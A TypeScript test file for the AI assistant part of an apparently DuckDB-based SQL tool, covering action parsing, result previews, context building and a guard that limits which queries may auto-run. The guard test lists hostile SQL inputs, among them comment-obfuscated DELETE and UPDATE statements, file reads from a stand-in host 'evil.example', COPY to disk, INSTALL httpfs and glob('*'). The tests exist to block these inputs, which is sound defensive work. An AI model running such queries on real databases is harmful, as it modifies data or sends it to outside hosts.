import { test } from "node:test";
import assert from "node:assert/strict";
import {
  buildAssistantContext,
  extractRunRequest,
  parseAction,
  resultPreview,
  runResultMessage,
} from "../src/lib/ai/assistant-context";

const result = {
  columns: ["dept", "n"],
  columnTypes: ["VARCHAR", "BIGINT"],
  rows: [
    { dept: "Eng", n: 4 },
    { dept: null, n: 1 },
  ],
  rowCount: 2,
  executionTimeMs: 3,
};

test("extractRunRequest finds the sql-run block only", () => {
  assert.equal(extractRunRequest("Looking.\n```sql-run\nSELECT 1\n```"), "SELECT 1");
  assert.equal(extractRunRequest("```sql\nSELECT 1\n```"), null);
  assert.equal(extractRunRequest("no blocks"), null);
});

test("parseAction accepts known actions and rejects malformed ones", () => {
  assert.deepEqual(parseAction('{"type":"run_in_tab","title":"x","sql":"SELECT 1"}'), {
    type: "run_in_tab",
    title: "x",
    sql: "SELECT 1",
  });
  assert.equal(parseAction('{"type":"run_in_tab"}'), null);
  assert.equal(parseAction('{"type":"drop_everything"}'), null);
  assert.equal(parseAction('{"type":"show_panel","panel":"nope"}'), null);
  assert.equal(parseAction('{"type":"set_join","from":"a.b","to":"c.d","verdict":"maybe"}'), null);
  assert.equal(parseAction("not json"), null);
  assert.deepEqual(parseAction('{"type":"discover_joins","extra":1}'), { type: "discover_joins" });
});

test("result previews show NULLs and the row count", () => {
  assert.equal(resultPreview(result), "dept | n\nEng | 4\nNULL | 1");
  assert.match(runResultMessage("SELECT", result, null), /2 rows, 3 ms/);
  assert.match(runResultMessage("SELECT", null, "Binder Error"), /failed:\nBinder Error/);
});

test("assistant context covers tabs, the active result, snippets and spaces", () => {
  const context = buildAssistantContext({
    tables: [],
    views: [],
    profiles: {},
    relationships: [],
    verdicts: {},
    relationshipKey: () => "",
    log: [],
    editorQuery: "",
    editorError: null,
    tabs: [{ title: "Query 1", query: "SELECT 1", active: true, error: null }],
    result,
    snippets: [{ name: "Top", folder: "Reports" }],
    spaces: [{ name: "Playground", tableCount: 2, current: true }],
    viewMode: "sql",
  });
  assert.match(context, /## Open tabs\n- \(active\) Query 1: SELECT 1/);
  assert.match(context, /## Result in the active tab \(2 rows, 3 ms\)/);
  assert.match(context, /- Reports \/ Top/);
  assert.match(context, /- \(open\) Playground \(2 tables\)/);
});

test("auto-run accepts plain queries only", async () => {
  const { autoRunRejection } = await import("../src/lib/ai/assistant-context");
  for (const ok of [
    "SELECT COUNT(*) FROM employees",
    "with x as (select 1) select * from x",
    "FROM employees LIMIT 5",
    "DESCRIBE employees",
    "SUMMARIZE employees",
    "SELECT * FROM t WHERE status = 'deleted' -- update later",
    "(SELECT 1) UNION ALL (SELECT 2)",
  ]) {
    assert.equal(autoRunRejection(ok), null, ok);
  }
  for (const bad of [
    "EXPLAIN ANALYZE DELETE FROM t WHERE a=1",
    "WITH x AS (SELECT 1) DELETE/**/FROM t WHERE a=2",
    'WITH x AS (SELECT 1) UPDATE"t" SET a=100 WHERE a=3',
    "SELECT * FROM read_csv('https://evil.example/x?d=1')",
    "SELECT * FROM 'https://evil.example/x.parquet'",
    "SELECT * FROM read_parquet('local.parquet')",
    "SELECT * FROM query('SELECT 1')",
    "COPY t TO 'out.csv'",
    "SET threads = 1",
    "PRAGMA version",
    "INSTALL httpfs",
    "CREATE TABLE x AS SELECT 1",
    "SELECT * FROM glob('*')",
  ]) {
    assert.notEqual(autoRunRejection(bad), null, bad);
  }
});
